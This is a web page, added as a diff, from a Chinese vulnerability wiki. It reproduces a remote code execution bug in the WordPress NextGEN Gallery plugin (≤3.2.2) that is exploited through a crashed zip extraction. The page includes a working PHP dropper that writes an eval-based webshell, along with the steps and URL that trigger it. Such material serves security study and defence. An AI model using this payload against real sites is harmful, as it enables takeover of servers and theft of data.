@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20%E6%8F%92%E4%BB%B6%E6%BC%8F%E6%B4%9E/WordPress%20Plugin%20-%20NextGEN%20Gallery%20_%3D%203.2.2%20RCE/">
+    <link rel="shortcut icon" href="../../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>WordPress Plugin - NextGEN Gallery \&lt;= 3.2.2 RCE - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "WordPress Plugin - NextGEN Gallery \\\u0026lt;= 3.2.2 RCE", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../../js/base.js"></script>
+      <script src="../../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../WordPress%20Plugin%20-%20Quizlord%202.0%20XSS/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../WordPress%20Plugin%20-%20Quizlord%202.0%20XSS/" class="btn btn-xs btn-link">
+        WordPress Plugin - Quizlord 2.0 XSS
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WordPress%20Plugin%20-%20Google%20Review%20Slider%206.1%20SQL%20Injection/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WordPress%20Plugin%20-%20Google%20Review%20Slider%206.1%20SQL%20Injection/" class="btn btn-xs btn-link">
+        WordPress Plugin - Google Review Slider 6.1 SQL Injection
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="wordpress-plugin-nextgen-gallery-322-rce">WordPress Plugin - NextGEN Gallery \&lt;= 3.2.2 RCE<a class="headerlink" href="#wordpress-plugin-nextgen-gallery-322-rce" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>WordPress插件NextGEN Gallery \&lt;=
+3.2.2版本将上传的zip压缩包解压到/wp-content/uploads目录下的临时目录，该临时目录具有显著特点：以unpacked开头。</p>
+<p>当zip压缩文件包含大量图片时将导致处理进程崩溃，而临时目录没有删除。如果在zip压缩包中放置一个php文件，那么该php文件会被解压到临时目录造成RCE漏洞。</p>
+<p>官方在2019年6月4日发布了3.2.4版本修复了漏洞。</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="1zip">第1步：制作Zip压缩包<a class="headerlink" href="#1zip" title="Permanent link">&para;</a></h3>
+<p>我制作了一个包含800张图片和1个恶意php文件（abc233.php）的zip压缩包，图片都是几KB的小图片，恶意php文件的功能是往上级目录写入webshell，abc233.php文件内容如下：</p>
+<div class="codehilite"><pre><span></span><code><span class="cp">&lt;?php</span>
+    <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">&#39;../webshell666.php&#39;</span><span class="p">,</span> <span class="s1">&#39;&lt;?php @eval($_REQUEST[&quot;cmdx&quot;]);?&gt;&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div>
+
+<h3 id="2zip">第2步：上传zip压缩包<a class="headerlink" href="#2zip" title="Permanent link">&para;</a></h3>
+<p>点击"Add Gallery / Images"然后上传zip压缩包。</p>
+<p><img alt="" src="./resource/WordPressPlugin-NextGENGallery&lt;=3.2.2RCE/media/rId26.png" /></p>
+<h3 id="3">第3步：查看临时目录<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<p>点击"import folder"，再点击"uploads"即可看到解压的临时目录。</p>
+<p><img alt="" src="./resource/WordPressPlugin-NextGENGallery&lt;=3.2.2RCE/media/rId28.png" /></p>
+<h3 id="4webshell">第4步：生成webshell<a class="headerlink" href="#4webshell" title="Permanent link">&para;</a></h3>
+<p>访问临时目录下的abc233.php文件即可在/wp-content/uploads目录下生成webshell。</p>
+<div class="codehilite"><pre><span></span><code><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">wp</span><span class="o">-</span><span class="n">content</span><span class="o">/</span><span class="n">uploads</span><span class="o">/</span><span class="n">unpacked</span><span class="o">-</span><span class="n">phpA0CB</span><span class="o">.</span><span class="n">tmp</span><span class="o">/</span><span class="n">abc233</span><span class="o">.</span><span class="n">php</span>
+</code></pre></div>
+
+<p><img alt="" src="./resource/WordPressPlugin-NextGENGallery&lt;=3.2.2RCE/media/rId30.png" /></p>
+<p>image</p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../WordPress%20Plugin%20-%20Quizlord%202.0%20XSS/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../WordPress%20Plugin%20-%20Quizlord%202.0%20XSS/" class="btn btn-xs btn-link">
+        WordPress Plugin - Quizlord 2.0 XSS
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../WordPress%20Plugin%20-%20Google%20Review%20Slider%206.1%20SQL%20Injection/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../WordPress%20Plugin%20-%20Google%20Review%20Slider%206.1%20SQL%20Injection/" class="btn btn-xs btn-link">
+        WordPress Plugin - Google Review Slider 6.1 SQL Injection
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
